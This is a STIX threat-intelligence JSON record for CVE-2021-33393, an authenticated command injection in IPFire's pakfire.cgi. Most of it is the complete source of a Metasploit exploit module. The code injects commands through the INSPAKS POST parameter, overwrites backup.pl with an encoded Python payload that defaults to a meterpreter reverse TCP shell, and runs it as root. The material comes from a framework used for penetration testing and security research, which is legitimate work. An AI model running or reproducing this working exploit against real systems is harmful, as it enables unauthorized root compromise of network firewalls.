{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bf86608-5014-4bd1-9788-76dbe01f4a75",
    "created": "2024-08-14T17:01:52.175932Z",
    "modified": "2024-08-14T17:01:52.175936Z",
    "name": "IPFire 2.25 Core Update 156 and Prior pakfire.cgi Authenticated RCE",
    "description": " This module exploits an authenticated command injection vulnerability in the /cgi-bin/pakfire.cgi web page of IPFire devices running versions 2.25 Core Update 156 and prior to execute arbitrary code as the root user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ipfire_pakfire_exec.rb",
            "external_id": "ipfire_pakfire_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33393"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/MucahitSaratar/ipfire-2-25-auth-rce"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=5FUXV7dfNjg"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IPFire 2.25 Core Update 156 and Prior pakfire.cgi Authenticated RCE',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability in the\n          /cgi-bin/pakfire.cgi web page of IPFire devices running versions 2.25 Core Update 156\n          and prior to execute arbitrary code as the root user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'M\u00fccahit Saratar <trregen222@gmail.com>', # vulnerability research & exploit development\n          'Grant Willcox' # Module enhancements and documentation fixes.\n        ],\n        'References' => [\n          [ 'EDB', '49869' ],\n          [ 'CVE', '2021-33393'],\n          [ 'URL', 'https://github.com/MucahitSaratar/ipfire-2-25-auth-rce'],\n          [ 'URL', 'https://www.youtube.com/watch?v=5FUXV7dfNjg'],\n        ],\n        'Platform' => ['python' ],\n        'Privileged' => true,\n        'Arch' => [ ARCH_PYTHON ],\n        'Targets' => [\n          [\n            'Python Dropper',\n            {\n              'Platform' => 'python',\n              'Arch' => [ ARCH_PYTHON ],\n              'Type' => :unix_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2021-05-17',\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ CONFIG_CHANGES, IOC_IN_LOGS ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(444),\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ true, 'Password to login with', '']),\n      ]\n    )\n  end\n\n  def vpath\n    '/cgi-bin/pakfire.cgi' # vulnerable path\n  end\n\n  def send_packet(method, execstr, waitsec)\n    myheaders = {\n      'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n      'Referer' => \"https://#{datastore['RHOST']}:#{datastore['RPORT']}/\"\n    }\n    if method == 'GET'\n      response = send_request_cgi(\n        'uri' => vpath,\n        'headers' => myheaders,\n        'SSL' => true,\n        'timeout' => waitsec\n      )\n    else\n      response = send_request_cgi(\n        'uri' => vpath,\n        'headers' => myheaders,\n        'SSL' => true,\n        'method' => 'POST',\n        'vars_post' => {\n          'INSPAKS' => \";#{execstr}\",\n          'ACTION' => 'install',\n          'x' => Rex::Text.rand_text_numeric(2),\n          'y' => Rex::Text.rand_text_numeric(2)\n        },\n        'timeout' => waitsec\n      )\n    end\n    response\n  end\n\n  def check\n    cevap = send_packet('GET', '', 10)\n    if cevap.nil? || cevap.body.empty?\n      return CheckCode::Unknown('No response from the target!')\n    end\n\n    unless cevap.body.scan(/401 Unauthorized/).empty?\n      return CheckCode::Unknown('Invalid credentials supplied! Check USERNAME and PASSWORD options!')\n    end\n\n    version = cevap.body.scan(/IPFire (.*) \\(.*\\) - Core Update [0-9]{3}/).flatten[0] || ''\n    core = cevap.body.scan(/IPFire .* \\(.*\\) - Core Update (.*)/).flatten[0] || ''\n    unless version\n      return CheckCode::Safe('Target is not IPFire')\n    end\n    if core.to_i >= 157\n      return CheckCode::Safe(\"Target is running IPFire #{version} (Core Update #{core})\")\n    end\n\n    CheckCode::Appears(\"Target is running IPFire #{version} (Core Update #{core})\")\n  end\n\n  def exploit\n    temp_backup_file = Rex::Text.rand_text_alphanumeric(5, 30)\n    print_status(\"Backing up backup.pl to /tmp/#{temp_backup_file}...\")\n    if send_packet('POST', \"cp /var/ipfire/backup/bin/backup.pl /tmp/#{temp_backup_file}\", 1).nil?\n      fail_with(Failure::Unreachable, \"#{peer} disconnected whilst trying to back up backup.pl!\")\n    end\n\n    print_status('Overwriting the contents of backup.pl with a Python header statement')\n    if send_packet('POST', 'echo \"#!/usr/bin/python\" > /var/ipfire/backup/bin/backup.pl', 1).nil?\n      fail_with(Failure::Unreachable, \"#{peer} disconnected whilst trying to overwrite backup.pl!\")\n    end\n\n    print_status('Appending the contents of backup.pl with the Python code to be executed.')\n    if send_packet('POST', \"echo \\\"#{payload.encoded}\\\" >> /var/ipfire/backup/bin/backup.pl\", 1).nil?\n      fail_with(Failure::Unreachable, \"#{peer} disconnected whilst trying to append to backup.pl!\")\n    end\n\n    print_status('Executing /usr/local/bin/backupctrl to run the payload')\n    unless send_packet('POST', '/usr/local/bin/backupctrl', 1).nil?\n      fail_with(Failure::UnexpectedReply, 'Something went wrong, the server should not respond after we execute the payload.')\n    end\n\n    print_good('You should now have your shell, restoring the original contents of the backup.pl file...')\n    if send_packet('POST', \"cp /tmp/#{temp_backup_file} /var/ipfire/backup/bin/backup.pl\", 20).nil?\n      fail_with(Failure::Unreachable, \"#{peer} disconnected whilst trying to restore backup.pl!\")\n    end\n\n    print_status('All done, enjoy the shells!')\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-17",
    "x_mitre_platforms": [
        "python'"
    ]
}